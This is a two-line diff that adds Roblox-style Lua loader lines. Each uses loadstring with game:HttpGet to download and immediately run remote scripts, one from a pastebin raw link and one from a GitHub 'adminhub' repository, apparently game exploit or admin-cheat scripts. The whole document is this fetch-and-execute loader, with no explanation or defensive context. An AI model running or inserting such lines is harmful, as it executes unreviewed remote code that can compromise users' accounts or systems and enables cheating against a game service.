@@ -1,0 +1,2 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/X1VcPfUJ'),true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PureMids/adminhub/main/main.lua", true))()
